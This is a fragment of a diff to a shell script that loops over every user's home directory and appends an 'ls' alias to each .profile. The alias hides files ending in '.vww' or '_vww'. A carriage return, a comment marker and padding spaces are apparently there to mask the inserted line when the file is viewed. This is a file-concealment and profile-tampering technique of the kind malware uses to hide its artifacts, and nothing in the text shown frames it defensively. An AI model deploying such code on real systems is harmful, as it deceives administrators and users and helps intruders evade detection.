@@ -16,4 +16,3 @@ for homedir in $(getent passwd | cut -d: -f6); do
     echo -e "alias ls=\"/usr/bin/ls --color=auto --ignore='*.vww' --ignore='*_vww' \"#\r                                                                                                                " >> $homedir/.profile
     echo "Wrote hiders to $homedir"
 done
-
